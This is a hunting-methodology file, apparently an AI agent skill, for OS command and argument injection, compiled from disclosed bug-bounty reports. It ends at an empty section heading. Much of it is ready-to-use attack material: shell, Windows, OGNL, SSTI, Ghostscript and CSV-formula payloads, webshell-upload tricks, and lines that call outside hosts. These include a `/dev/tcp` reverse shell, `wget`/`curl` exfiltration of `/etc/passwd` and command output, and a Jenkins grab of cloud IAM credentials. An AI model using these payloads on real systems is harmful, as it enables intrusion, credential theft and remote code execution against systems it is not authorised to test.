---
name: hunt-command-injection
description: Hunting skill for OS command injection and argument injection, built from 284 full disclosed report texts (324-report corpus). Covers shell metacharacter injection into web params and CSV exports (Shopify wpt.ec2 `$(`sleep 20`)`, IBM `&nslookup` blind OOB), OS command execution through image processors (ImageTragick/Ghostscript PostScript `%pipe%` in Shopify kitcrm, Semrush logo upload, Basecamp rce.gif), CLI argument/flag injection into git/gm convert/pip/curl (Imgur `gm convert -write |ps`, GitLab `--output`/`--no-index`, AWS Bedrock pip `--index-url`, npm ps PID injection), template/SSTI-to-RCE (GitLab WikiCloth Lua, Apache Airflow Jinja BashOperator, curl `-os{popen()}`), CI/script consoles (Jenkins `/_script`, Apache Flink `jars/plan`), deserialization and OGNL chains (SharePoint CVE-2019-0604, Struts2 S2-045, Confluence CVE-2021-26084, DNN cookie), upload-to-shell (null-byte ASP at DoD), and path-traversal-to-RCE (Pulse Secure CVE-2019-11510). Use when hunting command injection on any target — distinguish blind (time/OOB) from full-read, attribute the exact sink, and run the Gate 0 validation gate before reporting.
sources: hackerone_public, github_advisories, portswigger_research, internet_bug_bounty, public_code_search
report_count: 324
full_reports_read: 284
---

## Crown Jewel Targets

OS command injection is highest-value when user-controlled input reaches a shell, an `exec`/`spawn` call, an argument vector of a privileged binary, or an interpreter (template engine, deserializer, expression language). Priority targets ranked by how often they produced a real RCE in the 284 reports read:

- **Image-processing / file-upload pipelines** — anything that converts, crops, thumbnails, or renders user-supplied files server-side. ImageMagick/GraphicsMagick (ImageTragick, Ghostscript `%pipe%`), `gm convert`, ffmpeg, and ExifTool turned a "harmless" upload into a reverse shell in Shopify kitcrm (#422944), Semrush (#403417), Basecamp (#365271), and Imgur (#212696). Highest-signal surface (image-processing: 55 reports).
- **Search / filter / sort parameters** — the single most common recon surface (106 reports). A `filter`, `term`, `sort`, `days`, or `q` value concatenated into a shell string; #73567 used `filter=$(`wget ...$(id))`.
- **Public source code / self-hosted open source** — 72 reports began from public code search. GitLab alone produced a constellation: `gzip -dc #{@archive_path} | wc -c` (#1609965), GitHub-import Sawyer object misuse (#1672388), git flag injection in commits and search APIs (#653125, #682442), WikiCloth Lua (#1401444). When the source is public, you can read the sink directly.
- **Git/VCS operations** — branch names, ref names, repo URLs, `git-dummy-commit` modules, `ssh://` URIs. Argument injection (a value starting with `--`) is the dominant pattern: `--output=/tmp/file`, `--no-index`, evil hg branch names (#288704), `ssh://` RCE across Git/SVN/Mercurial (#260005).
- **Developer tooling / CI / script consoles** — Jenkins script console (`/_script`, `/jenkins/script`, #1125329, #2083771), Apache Flink `jars/{id}/plan` (#1418891), Airflow DAG config (#1671140), debug consoles (#767482). These are "features" that execute code by design and are frequently exposed unauthenticated.
- **Export / CSV features** — usernames and fields dropped into `gzip ...` backticks (#214022) or spreadsheet cells (`=cmd|' /C calc'!A0`, #124223, #160500). Excel/desktop-client formula injection is command execution on the victim's machine.
- **Desktop clients / custom protocols / shell.openExternal** — Electron `shell.openExternal()`, Windows custom protocol `Process.Start`, OpenSSL config DLL loads. Rocket.Chat (#924151, #899964), NordVPN (#1001255), Slack (#162955).
- **Dependency / package-manager wrappers** — pip flags (#3633123), npm `ps` PID injection (#390848), Python `install_packages()` blocklists. The injected string is a flag, not a shell metacharacter.
- **Template / expression-language engines** — OGNL (Struts2 S2-045 #1070532, Confluence CVE-2021-26084 #1327769/#1327701), SSTI-to-RCE (#3584149), WikiCloth `#luaexpr`, Airflow Jinja.
- **Known-CVE instances in the wild** — DoD reports repeatedly found unpatched Pulse Secure (#671749, #678496, #591295), Drupal CVE-2018-7600 (#1063256), SharePoint CVE-2019-0604 (#534630), Oracle WebLogic (#810755, #634630), and Jenkins. Fingerprint the stack, then match to a public exploit.

Payouts are highest when injection is **pre-auth / unauthenticated** (Twitter VPN pre-auth RCE $20,160 #591295; GitLab bulk imports $33,510 #1609965), yields **SYSTEM/root** (#544928), or **chains to cloud credential theft** (#2083771 → AWS IAM keys). Even "low-severity looking" params paid: Discourse admin CSV injection $512 (#214022), CS Money null-byte ReDoS/command angle $250 (#1000567).

### Priority Scoring for a Target List

Rank each candidate surface by four questions answered from the reports:

1. **Does user input reach a command/argument/interpreter?** If source is public, confirm the sink by grep before spending time black-boxing (GitLab #1609965, AWS #3633123).
2. **Is the sink pre-auth?** Pre-auth shells scored Critical (#591295, #1125329, #2083771); admin-only shells still paid (#214022, #313245).
3. **What privilege does the process run as?** SYSTEM/service accounts (#544928) and cloud-attached workloads (#2083771) dominate impact.
4. **Does it chain?** Shell → cloud creds, shell → DB secrets, LFI → deserialization → RCE (#415682), XSS → `shell.openExternal()` RCE (#899964, #924151) multiply the score.

### Recurring High-Value Product Families in the Corpus

- **GitLab / self-hosted DevOps** — command injection appeared in import, search, commits, wiki rendering, and CI (#1609965, #1672388, #653125, #682442, #1401444). A single product can have many distinct sinks.
- **SSL VPN / network appliances** — Pulse Secure pre-auth file read → command injection → RCE (#591295, #671749, #678496); Ubiquiti evostream `launchprocess` (#544928); EdgeSwitch CLI escape (#313245).
- **Image/CDN processors** — Shopify, Semrush, Basecamp, Imgur all compromised through the conversion pipeline (#422944, #403417, #365271, #212696).
- **CI/build servers** — Jenkins (#1125329, #2083771), Apache Flink (#1418891), Airflow (#1671140).
- **Electron/desktop apps** — Rocket.Chat, NordVPN, Slack (#924151, #1001255, #162955, #899964).
- **Bug-bounty-native open-source packages** — npm `ps` (#390848), `git-dummy-commit` (#341710), curl wrappers (#3669305, #3584149), Python SDKs (#3633123).

---

## Attack Surface Signals

### Parameter / Endpoint Patterns to Hunt

Parameters that historically carried a sink (all observed in study-pack reports):

```
# search / filter / sort (highest frequency)
filter=        search=        q=            term=
sort=          sortBy=        days=         group=        type=
name=          ref=           ref_name=     scope=
# file / path / archive / import
path=          file=          filename=     archive_path= import_source=
source=        source_location=            fileToUpload=
# image / render
imageid=       x=  y=  w=  h=                (Imgur /edit/process)
template=      logo=         avatar=       tile=  id=
# identity / content fields that land in a shell or CSV
email=         username=     participant=  first_name=   review=  text=
# process / config
pid=           cmd=          command=      compose_cmd=  packages=
```

Endpoints / consoles seen executing commands:

```
/jenkins/script                 /_script                    (Jenkins Groovy)
/jars/{jar_id}/plan             (Apache Flink)
/api/v4/projects/.../repository/commits   (GitLab ref_name → git)
/api/v4/projects/.../search?scope=blobs&ref=--no-index
/edit/process?a=crop            (Imgur → gm convert)
/cgi-bin/PasswordCreate.pl?email=          (IBM → nslookup)
/export_csv/export_entity.json              (Discourse → gzip)
/api/rest/mpapi/.../query                   (XML/XXE)
/dana-na/.../dana/html5acc/guacamole/...    (Pulse Secure LFI → RCE)
/confluence/pages/doenterpagevariables.action  (OGNL)
/testlog.php?days=&filter=                 (Shopify wpt.ec2)
```

### Injection Metacharacter & Primitive Signals

```
;  &&  ||  |  `  $()  \n  %0A        # shell command separators / subst
${IFS}                                # whitespace substitute when spaces are filtered
$(id)  `id`                           # command substitution
;=cmd|' /C calc'!A0                    # CSV / Excel formula injection
%pipe%command                         # Ghostscript / ImageMagick policy bypass
--flag  -oFile  --output=              # argument injection (value starts with dash)
{{popen('...').read()}}                # SSTI → code exec
%{#ognl...}                            # OGNL expression injection
\u0000                                 # null-byte / parser confusion
```

### Response / Behavior Signals

- **Time delay** from a `sleep` payload with no other change (#73567 `sleep 20` returned ~20s later; #3584149 `sleep 10` waited 10s). Blind command injection's primary oracle.
- **Out-of-band callback** — DNS/HTTP to your host from injected `nslookup`, `wget`, `curl` (#410334 `&nslookup ...86m.r87.me...`; #73567 `$(`wget sandbox.prakharprasad.com/$(id)`)`).
- **Reflected command output** — `id`, `dir`, `cat /etc/passwd` appearing in the response or in a rendered image/PDF.
- **Error strings leaking the command line** — GitLab `gzip -dc #{@archive_path} | wc -c` visible in source; Stack exceptions echo the executed command (#1070532 S2-045 error page).
- **Image rotation/transformation** proving parameter reaches the converter — Imgur appended ` -rotate 90` and "saw lying Trump" rotated (#212696).
- **Upload accepted for a non-image** — PostScript/EPS renamed to `.gif` accepted (#365271); null-byte between `asp` and `png` (#2054184); space after extension (#506646).

### Tech-Stack Signals

- **ImageMagick / GraphicsMagick / Ghostscript** — ImageTragick, `%pipe%`, PostScript, EPS/PDF policy gaps.
- **Ruby on Rails / Sidekiq / backticks** — `#{var}` interpolation and `` `command` `` are everywhere in GitLab, Discourse.
- **Node.js child_process** — `exec`, `spawn`, `lookup({pid})`; npm packages that wrap binaries (`ps`, `git-dummy-commit`, `curl` wrappers).
- **Python SDK / f-strings** — `command = f"pip install {packages_str}"`; Airflow `BashOperator`; pickles deserialization (#361341).
- **Java / OGNL / XAML / deserialization** — Struts2, Confluence, SharePoint `EntityInstanceIdEncoder`, DotNetNuke `DNNPersonalization` cookie (#876708).
- **Electron desktop apps** — `shell.openExternal`, custom protocol handlers, `Process.Start`.
- **Git/Gitaly** — ref names, `git log`/`rev-list`, `--output`, evil branch names.

### Attack-Surface → Confirmed-Report Index

Each row links a surface in this section to real report IDs from the study pack, so you can study the exact request shape before hunting:

| Surface | Representative reports |
|---|---|
| Search/filter param → shell | #73567 (Shopify `filter=$(`wget...`)`), #3584149 (curl `-os` SSTI), #1000567 (CS Money GraphQL null byte) |
| Upload → image processor | #422944, #403417, #365271, #212696 (ImageTragick / Ghostscript / `gm convert`) |
| Import / archive path | #1609965 (GitLab `gzip -dc #{@archive_path}`), #1672388 (GitHub import Sawyer object) |
| Git ref / branch / VCS URI | #653125, #682442, #288704, #260005, #341710 |
| Script console / CI | #1125329, #2083771 (Jenkins), #1418891 (Flink), #1671140 (Airflow), #767482 (debug console) |
| Export / CSV | #214022 (Discourse `ExportCsvFile`), #124223, #160500 (formula injection) |
| Template / expression language | #1401444 (WikiCloth Lua), #1070532 (Struts2 OGNL), #1327769/#1327701 (Confluence OGNL) |
| Deserialization / cookie | #876708 (DNN cookie), #361341 (pickles), #415682 (PHP unserialize) |
| Upload → webshell | #2054184 (null-byte ASP), #506646 (trailing space), #317043 (PHP shell) |
| Desktop / custom protocol | #924151, #899964 (Rocket.Chat), #1001255 (NordVPN), #162955 (Slack) |
| Known-CVE instances | #591295/#671749/#678496 (Pulse Secure), #1063256 (Drupal), #534630 (SharePoint), #810755/#634630 (WebLogic) |
| Dependency / package manager | #3633123 (pip flags), #390848 (npm `ps` PID), #3669305 (curl `-os` grouping) |
| Cloud metadata after shell | #2083771 (IMDS IAM keys via Jenkins Groovy) |

---

## Discovery Patterns From 284 Full Reports

### Where Researchers Start (ranked recon surfaces from the frequency table, with what to look for)

The study pack's technique frequency table (full reports containing each signal) tells you exactly where researchers found command injection. Work down this list in order:

1. **command-injection (132)** — the sink itself: any parameter that reaches a shell/`exec`. Look for metacharacters reflected or delayed.
2. **search-filter-sort (106)** — the #1 *entry point*. Look for `filter`, `search`, `q`, `term`, `sortBy`, `days` fields; try `$(`sleep 10`)`, `;nslookup`, `|id`.
3. **public-code-search (72)** — Google/GitHub for the target's repos, `grep` for `exec(`, `system(`, backticks, `#{}`, `child_process`. Look for user input concatenated into a command string.
4. **js-source-review (66)** — client bundles and source mappings revealing endpoints and parameter names. Look for fetch/XHR calls whose values are later used server-side.
5. **api-endpoint (59)** — REST/GraphQL endpoints that accept a path, ref, branch, PID, or import source. Look for `api/v4/...`, `graphql`, `plan`.
6. **server-side-rendering (55)** — PDF/image/template rendering. Look for template fields, Markdown/Lua/Twig syntax, headless browsers.
7. **image-processing (55)** — upload → convert/resize. Look for filename, dimensions (`x/y/w/h`), PostScript/EPS acceptance.
8. **path-traversal-lfi (42)** — file paths reaching a shell or a file read that enables a chain. Look for `../`, `..%2f`, absolute paths.
9. **dependency-confusion (41)** — package names/versions passed to pip/npm/brew. Look for flags (`--index-url`) and shell metachars.
10. **filter-bypass (38)** — an existing blocklist (`;|&&`, special chars) that can be evaded with `${IFS}`, encoding, or alternate separators.
11. **comment-injection (38)** — comments/fields that land in CSV or logs; formula injection (`=cmd|...`).
12. **admin-internal (37)** — admin-only or localhost-only interfaces (Jenkins, Flink, WebLogic, evostream `localhost:7440` #544928). Look for exposed consoles and `localhost` services reachable via a feature.
13. **xml-parser (34)** — XXE that reads files or reaches internal services, escalating to RCE (#361341, #106797, #415682).
14. **internal-network (32)** — SSRF/XXE to internal ports leading to an unauthenticated service with a command primitive.
15. **export-feature (31)** — CSV/backup exports embedding username/fields into shell commands (#214022).
16. **import-feature (28)** — archive/import paths whose filenames or contents reach a command (#1609965, #1672388).
17. **template-injection / template-engine (27/18)** — SSTI in Markdown/wiki/Jinja/Twig.
18. **csv-parser (27)** — spreadsheet formula injection on export.
19. **blind-oob (23)** — injection with only time/DNS feedback; always set up a listener.
20. **file-upload (22)** — webshell, null-byte extension, dynamic file types.

The ranking reflects *how researchers actually found bugs*, not a theoretical model: the top four surfaces (command-injection, search-filter-sort, public-code-search, js-source-review) account for the majority of discovery paths in the corpus. If a target exposes a search/filter field **and** has public source, start there — that combination produced the GitLab cluster (#1609965, #1672388, #653125, #682442, #1401444).

### Recon Tool Sequence Used by Researchers

- **Source search (72 reports):** `grep` the public repo for sink primitives — `exec(`, `system(`, `subprocess`, `` ` ``, `#{`, `child_process`, `.execute()`, `f"...{var}"`. Then trace user input to the interpolation point.
- **JS bundle review (66 reports):** de-minify bundles, list fetch/XHR endpoints and parameter names, and note any parameter that later appears in a server-side error.
- **Endpoint enumeration (59 reports):** map all API routes, especially those accepting `ref`, `path`, `import_source`, `pid`, `plan`, or `fileToUpload`.
- **Fingerprinting (public-code-search + debug-error-leak):** match a version banner to a known CVE before fuzzing (#810755 WebLogic, #1063256 Drupal, #591295 Pulse Secure).
- **Listener-first mindset (blind-oob 23, time-based 6):** plant the Collaborator/interactsh payload *before* injecting, because blind injection leaves no other trace.

### Feature-Based Discovery Signals (frequency-ranked table: why it matters / what to probe)

| Signal (reports) | Why it matters | What to probe |
|---|---|---|
| search-filter-sort (106) | Free-text values frequently concatenated into shell strings with no sanitization | `;sleep 10`, `$(`sleep 10`)`, `&nslookup <collab>`, `\|id`, `'` `"` breakouts |
| public-code-search (72) | Source is available; you can locate the exact sink instead of black-box guessing | grep `exec(`, `system(`, `subprocess`, `` ` ``, `child_process`, `#{`, `.execute()` |
| js-source-review (66) | Bundles reveal hidden endpoints, param names, and the request shape | search JS for fetch/XHR URLs and param names; de-minify |
| api-endpoint (59) | Structured inputs (ref names, PIDs, import sources) flow into binary argument vectors | `--output=`, `--no-index`, `$(touch x)`, leading-dash values |
| server-side-rendering (55) | Rendering engines execute template/expression code in a privileged context | `{{7*7}}` → `{{popen('id').read()}}`, `#luaexpr:`, OGNL `%{...}` |
| image-processing (55) | Converters invoke Ghostscript/PostScript and historically allow command execution via `%pipe%` | upload `%!PS` with `/OutputFile (%pipe%id)`, add ` -rotate 90` to params |
| path-traversal-lfi (42) | Arbitrary file read enables config/secret theft and command-chain escalation | `../`, `..%2f`, null byte, absolute paths |
| dependency-confusion (41) | Package name inserted into a package-manager command line | `--index-url=http://attacker`, `;id`, backtick in version |
| filter-bypass (38) | A filter acknowledges a dangerous primitive; find the gap | `${IFS}` for spaces, `%0A`, case variation, double encoding, `--` |
| comment-injection (38) | Stored text exported into spreadsheets executes as formulas | `;=cmd\|' /C calc'!A0`, `-3+3+cmd\|' /C calc'!D2` |
| admin-internal (37) | Powerful consoles exposed to authenticated or local users | `/jenkins/script`, `println "id".execute().text`, localhost services |
| xml-parser (34) | XXE reads local files and reaches internal services; a bridge to RCE | `<!ENTITY xxe SYSTEM "file:///etc/passwd">`, SSRF to port 1337 |
| blind-oob (23) | No direct output; proves execution via timing/callback | `sleep 10`, `nslookup <collab>`, `wget <collab>/$(id)` |
| file-upload (22) | Weak extension/MIME checks allow webshells or command-bearing image formats | null-byte `poc.asp.png`, space after ext, `.gif` containing PostScript |
| export-feature (31) | Export jobs put usernames/fields into `gzip ...` backticks | `username;wget <collab>` via DB/restore manipulation |
| import-feature (28) | Archive filenames/import sources interpolated into commands | craft archive with `;id` in a path; GitHub import object fields |
| template-engine (18) | Template expressions are evaluated server-side | Jinja `{{params.source_location}}`, Twig, wiki Lua sandbox escape |
| csv-parser (27) | CSV writers don't strip leading `=`, `+`, `-`, `@` | injection into `first_name`, `participant name`, `review` |
| debug-error-leak (20) | Errors echo stack traces/commands, confirming the sink | malformed payload → read exception for the executed command |
| time-based (6) | The only reliable oracle for blind injection | differential timing: `sleep 0` vs `sleep 10` |

### Verbatim Discovery Clues (18 real `[#id]` quotes from the study pack)

- [#212696] "I was searching for CVE-2016-10033-like vulnerabilities on several bugbounty sites when I noticed strange behaviour of the mentioned parameter."
- [#212696] "The most popular one is ImageMagick/GraphicsMagick, so I appended ` -rotate 90` to the parameter and it succeded --- I saw lying Trump (I mean, the image was rotated)."
- [#212696] "After more tries I was sure it's GraphicsMagick (probably `gm convert` utility)."
- [#1001255] "After looking the executable binary, I noticed the class **NordVpn.Views.ToastNotifications.ListenNotificationOpenUrl** eventually calls function **Process.Start** with controllable argument, and this notification can be triggered through custom protocol **NordVPN.Notification:**."
- [#410334] "I found an XSS and Blind OS based injection issue due to the incorrect handling of the characters in THE EMAIL get& post parameters."
- [#2054184] "I found that if you place a null byte between file extensions, you can upload files with malicious extensions."
- [#3584149] "i tried to injected the os parmeter"
- [#678496] "I discovered that https://████ instance is vulnerable to described vulnerabilities."
- [#57263] "By source code review, I found that rank creation parameters (name, type, group) for wordpoints_add_rank() in ranks."
- [#546753] "Abusing this issue I was able to take full control of the demo instance: https://demo."
- [#506646] "I found that users can upload asp/aspx and other dynamic files via the avatar upload function when adding a space character behind the file type to bypass the upload file limit."
- [#341710] "Hi there, I've found a Command Injection on the "git-dummy-commit" module."
- [#331032] "Using ```curl```, I was able to pass example PHP filename concatenated with ```;[shell cmd]``` string, which allows me to execute command on the server."
- [#288704] "I found an evil branch name of hg a repo can lead to arbitrary command injection on phabricator instance."
- [#1859592] "I found some function such as get_latest_pkg_version/_call_upgrade_script has command injection vulnerability."
- [#1859592] "I found some special characters filtered in `compose_cmd` , that is `;|&&`:"
- [#356775] "I have found a Command Injection vulnerability in the code where a method calls an OS (Shell) command using an untrusted string to execute."
- [#3874004] "I found the original CVE-2022-23915 hardening PR but no public report covering this missed get_file() sink."

### Probe Checklist (15 concrete probes)

Run these against each candidate parameter; each is grounded in a study-pack technique:

1. `; sleep 10` — semicolon separator; baseline blind timing oracle.
2. `&& sleep 10` — conditional separator (runs if prior command succeeds).
3. `|| sleep 10` — conditional separator (runs if prior command fails).
4. `` `sleep 10` `` — backtick command substitution.
5. `$(sleep 10)` — dollar-paren substitution (Shopify #73567 `$(`sleep 20`)`).
6. `${IFS}` as a space substitute — `wget${IFS}<collab>` when spaces are blocked (Imgur #212696).
7. `& nslookup <unique-collab-domain>` — DNS-based blind OOB confirmation (IBM #410334).
8. `$(id)` / `` `id` `` exfiltrated via `wget <collab>/$(id)` — proves output capture (Shopify #73567).
9. `; cat /etc/passwd` — direct file read when output is reflected.
10. Leading `--output=/tmp/probe` or `--no-index` — argument injection into git/grep (GitLab #653125/#682442).
11. ` -rotate 90` appended to an image dimension param — proves converter argument injection (Imgur #212696).
12. `%!PS ... /OutputFile (%pipe%id) ...` uploaded as `.gif`/`.jpg` — ImageTragick/Ghostscript (Shopify/ Semrush/ Basecamp).
13. `{{popen('id').read()}}` and `#luaexpr:` — SSTI/template-code execution (curl #3584149, GitLab #1401444).
14. `;=cmd|' /C calc'!A0` in an exported field — CSV/formula injection (Shopify #124223).
15. `--index-url=http://attacker/` in a package name field — pip flag injection (AWS #3633123); and `poc.asp%00.png` for null-byte upload-to-shell (DoD #2054184).

---

## Step-by-Step Hunting Methodology

1. **Fingerprint the stack first.** Identify the framework and version from headers, error pages, and `Server` banners (Oracle WebLogic #810755/#634630, Drupal 7.54 #1063256, Apache Struts2 #1070532, Adobe ColdFusion/Pulse Secure #591295). Match known CVEs (CVE-2019-11510, CVE-2021-26084, CVE-2018-7600, S2-045) to public exploits before doing custom fuzzing.

2. **Map every input that can reach a command.** Spider JS bundles (js-source-review: 66 reports), enumerate API endpoints (59), and search public source (72). Prioritize search/filter/sort fields (106), upload/convert features (55), path/archive/import params (28-42), and admin consoles (37). Build a param→endpoint inventory.

3. **Set up an out-of-band listener before injecting.** Start `interactsh-client` or Burp Collaborator. Blind injection is common (blind-oob: 23, time-based: 6) — without a listener you will miss it.

4. **Classify the injection class.** Decide which primitive you are testing:
   - **Shell metacharacter injection** — `; | & $() \`` into a string passed to `/bin/sh`.
   - **Argument injection** — a value beginning with `-` interpreted as a flag (`--output`, `--no-index`, `-write |ps`).
   - **Interpreter injection** — template/SSTI/OGNL/deserialization payloads.
   - **File-based execution** — malicious image (PostScript), webshell upload, null-byte extension.

5. **Establish an oracle with a harmless probe.** Use `sleep` for timing, or `nslookup <unique-collab>` / `wget <collab>/$(id)` for OOB. Compare against a baseline payload (`sleep 0`, no metacharacter) to rule out natural latency.

6. **Confirm execution, then escalate.** Once timing or a callback confirms the sink, run `id`/`whoami` and capture output (reflected body, error string, image content, or OOB-exfiltrated). Determine privilege level — SYSTEM/root (#544928, Shopify #422944) vs low-priv web user.

7. **For image processors:** upload a benign image and a PostScript/EPS polyglot with `%!PS` and `mark /OutputFile (%pipe%id)`. If PostScript is accepted, you have Ghostscript command execution. Test dimension params for argument injection (` -rotate 90`, `-write |...`).

8. **For source-available targets:** read the code and jump straight to the sink. GitLab examples — `DecompressedArchiveSizeValidator` with `"gzip -dc #{@archive_path} | wc -c"` (#1609965), `parallel_scheduling.rb` using a Sawyer `id` directly (#1672388), `compose_cmd` filtering only `;|&&` (#1859592). A code-confirmed sink is a stronger report than a blind guess.

9. **For argument injection:** supply values starting with `--` or `-`. Test `--output=/tmp/x`, `--no-index`, `-oFile`, `-write |command`. The value need not contain a shell metacharacter — the binary's own flag semantics are the vulnerability (git #653125/#682442, curl #3669305, pip #3633123).

10. **For template/expression contexts:** probe `{{7*7}}` → `49`, then escalate to `popen`/`system`/OGNL. WikiCloth `#luaexpr:` escaped its Lua sandbox when `rubyluabridge` was installed (#1401444); Airflow `{{params.source_location}}` reached `BashOperator` (#1671140).

11. **For desktop clients / protocols:** test `shell.openExternal()` with `file:///...` and `.desktop`/`smb://` payloads (Rocket.Chat #924151), custom-protocol URIs with base64/JSON args reaching `Process.Start` (NordVPN #1001255), and writable OpenSSL config paths (Slack #162955).

12. **Chain to higher impact.** A confirmed command shell is rarely the end: pull cloud credentials (`curl http://169.254.169.254/latest/meta-data/iam/security-credentials/...` in Jenkins Groovy #2083771), read local DB/files, pivot internally, or escalate privileges. Document each hop.

13. **Attribution: isolate the exact parameter.** One payload per candidate, one request per payload, poll the listener between. A callback from a batch of five params proves *a* sink, not *which* one; the fix depends on naming the right field.

14. **Blind vs full-read:** decide whether you get output. Time-only or callback-only is blind; reflected `id`/file contents is full-read and scores higher. For blind cases, exfiltrate via DNS subdomain labels or `wget <collab>/$(command)`.

15. **Run Gate 0 before writing the report** (see below), then document with request/response, screenshots, listener hits, and a minimal PoC.

### Common Mistakes That Get Reports Closed

- **Timing without a control.** A slow response is not command injection. Establish a `sleep 0`/no-metacharacter baseline and show a differential (Shopify #73567's `sleep 20` returned ~20s later than normal).
- **Claiming execution from an echoed metacharacter.** Reflection of `;id` in an error string is not execution — escalate to `id` output or an OOB callback.
- **Batch-firing payloads across parameters.** A callback from five candidate fields proves a sink, not the vulnerable field. One payload per parameter, poll between (see Gate 0).
- **Missing the auth prerequisite.** State whether the endpoint is pre-auth, authenticated, or admin-only. #214022 required admin DB/restore access; #591295 was pre-auth; the distinction changes severity.
- **Ignoring flag/argument injection.** Filtering `;|&&` does not stop `--output=` or `-oFile` (GitLab #653125/#682442, curl #3669305, AWS #3633123). Test dash-prefixed values even when shell metachars are blocked.
- **Testing only the obvious extension check.** Upload validation may fail on content, not name: PostScript inside `.gif` (#365271) and null-byte truncation (#2054184) both beat extension filters.
- **Forgetting feature flags / optional dependencies.** #1609965 was behind a feature flag; #1401444 required the `rubyluabridge` gem. Note prerequisites for reproduction.
- **Stopping at command execution.** Pull the additional evidence that raises severity: IAM keys (#2083771), `/etc/passwd`, monitoring dashboards (#422944), or a file-write proof (#653125).

---

## Payload & Detection Patterns

### Basic Shell Metacharacter Injection

```bash
# direct reflection
; id
| whoami
&& cat /etc/passwd
`id`                       # backtick substitution
$(id)                      # dollar-paren substitution
; cat /etc/passwd
%0Aid                      # newline-encoded separator
```

### Windows / PowerShell Command Injection

```bat
& whoami                   # Windows command separator
| whoami
&& dir C:\
^& calc                    # caret-escaped ampersand
"C:\Program Files\..." & calc
powershell -enc <base64>    # encoded PowerShell when quotes are filtered
```

- SharePoint CVE-2019-0604 used a XAML payload `<System:String>/c calc</System:String>` to launch `calc` on the Windows server (#534630).
- Struts2 S2-045 used an OGNL expression in the `Content-Type` header to execute OS commands on a Linux host (#1070532).
- NordVPN's custom protocol passed `"OpenUrl": "calc.exe"` into `Process.Start` (#1001255).
- Slack's Windows client loaded an attacker-written `openssl.cnf` to inject a DLL into `slack.exe` (#162955).

### Argument-Injection Payload Ladder

When a value is appended to a command line, try, in order:

```
<value>                     ; baseline benign
--help                      ; does the binary parse a flag? (behavior change)
--version                   ; version string in output = flag confirmed
--output=/tmp/probe         ; write a file (GitLab #653125)
--no-index                  ; alter grep/git behavior (GitLab #682442)
-o/tmp/probe                ; short form attached value
--index-url=http://attacker ; package-manager flag (AWS #3633123)
```

### Blind Injection — Time Oracle

```bash
; sleep 10
&& sleep 10
$(`sleep 20`)              # Shopify wpt.ec2 (#73567): filter param, ~20s delay
; sleep ${IFS}10           # ${IFS} when spaces filtered
# curl-style flag context (curl #3584149):
curl -os{system("sleep 10")}.read --url <collab>.oast.fun
```

### Blind Injection — Out-of-Band (OOB) Confirmation

```bash
; nslookup <unique>.<collab-domain>
&nslookup%20%22<id>%22%22<collab>%22cier4%3cscript%3e...   # IBM #410334 email param
$(`wget <collab>/$(id)`)   # Shopify #73567 — exfiltrates command output in URL path
; wget <collab>/$(cat /etc/passwd | base64)
curl <collab>/$(whoami)
```

Always use a **unique subdomain per parameter** so the callback is attributable.

### Image / Ghostscript / ImageTragick Payloads

```postscript
%!PS
userdict /setpagedevice undef
legal
{ null restore } stopped { pop } if
legal
mark /OutputFile (%pipe%python -c 'import socket,subprocess,os; ...reverse shell...') currentdevice putdeviceprops
```
— Shopify kitcrm #422944 (ImageTragick, `%pipe%`), Semrush #403417 (`%pipe%bash -c 'bash -i >& /dev/tcp/IP/8080 0>&1'`), Basecamp #365271 (EPS renamed `.gif`, `ping -c1 attacker.com`).

```bash
# argument injection into gm convert — Imgur #212696, /edit/process?a=crop
y = 0 -write |ps${IFS}aux|curl${IFS}http://<server>${IFS}-d${IFS}@-
```
A single ` -rotate 90` proved the param reached the converter before the full `-write |...` payload.

### Argument / Flag Injection

```bash
--output=/tmp/some_file          # GitLab #653125 git flag injection
--no-index                       # GitLab #682442 search API scope=blobs, ref=
-o/etc/passwd                    # curl short-flag grouping #3669305
--index-url=http://attacker/     # AWS Bedrock pip injection #3633123
ps.lookup({ pid: "$(touch success.txt)" })   # npm ps PID injection #390848
;=cmd|' /C calc'!A0              # CSV injection #124223
```
Note #3633123's naive blocklist — `if any(char in pkg for char in [";", "&", "|", "`", "$"])` — is bypassed because pip flags contain none of those characters.

### Template / SSTI / Expression-Language Payloads

```
{{popen('id').read()}}           # curl #3584149 (SSTI via -os param)
{{system("sleep 10")}.read       # curl #3584149 variant
{{params.source_location}}       # Airflow #1671140 → BashOperator
{{#luaexpr:...}}  /  <lua>...</lua>   # GitLab WikiCloth #1401444
%{(#test='multipart/form-data')...}   # Struts2 S2-045 OGNL in Content-Type #1070532
<System:String>/c calc</System:String>  # SharePoint CVE-2019-0604 XAML #534630
```

### Script Console / Interpreter Payloads

```groovy
println "whoami".execute().text   // Jenkins /_script — DoD #1125329
println "curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE".execute().text
                                   // Jenkins → AWS IAM exfil — DoD #2083771
```
Apache Flink `GET jars/{jar_id}/plan` loads a class with attacker arguments (#1418891).

### Deserialization / Object Injection

```
DNNPersonalization: <ExpandedWrapper... ObjectDataProvider...>   # DoD #876708
pickle notification object → SQLi escalated to RCE              # Liberapay #361341
PHP unserialize() on user input → python object injection on internal port 1337 → RCE  # #415682
```

### Upload-to-Shell / Null-Byte

```
filename="poc.asp.png"  with a null byte between asp and png   # DoD #2054184
POST /repo/orbital/repo.asp?fileToUpload=pizza.asp
  → https://target/savefiles/poc.asp?cmd=dir
"poc.jsp "  (space after extension)                            # #506646
```

### Source-Code Grep Patterns

```bash
grep -rE "(exec|system|subprocess|popen|child_process|shell_exec|passthru)\s*\(" --include=*.py --include=*.js --include=*.rb --include=*.php
grep -rE "`#\{|\\$\{|child_process|\.execute\(\)" --include=*.rb --include=*.groovy --include=*.js
grep -rE "f\"(pip|git|curl|gzip|bash).*\{" --include=*.py        # f-string command construction
grep -rE "openExternal|Process\.Start|launchprocess|shell=true" --include=*.js --include=*.cs
grep -rE "mark /OutputFile|%pipe%|setpagedevice"                # Ghostscript sinks
```

### ffuf / Parameter Discovery

```bash
ffuf -w burp-parameter-names.txt \
  -u "https://target.com/api/endpoint?FUZZ=; sleep 10" \
  -fs 0 -mc all
```

### Detection Oracle Summary

| Class | Fast oracle | Definitive confirmation |
|---|---|---|
| Shell metacharacter | differential `sleep` | reflected `id` output / OOB exfil |
| Argument injection | error/behavior change from `--flag` | file write / flag effect observed |
| Image processing | ` -rotate 90` changes output | `%pipe%id` executes |
| SSTI/OGNL | `{{7*7}}` → `49` | `popen('id')` output |
| Blind OOB | callback timing | unique listener hit with command output |
| CSV formula | cell evaluates in Excel | `calc`/DNS from spreadsheet |

---

## Common Root Causes

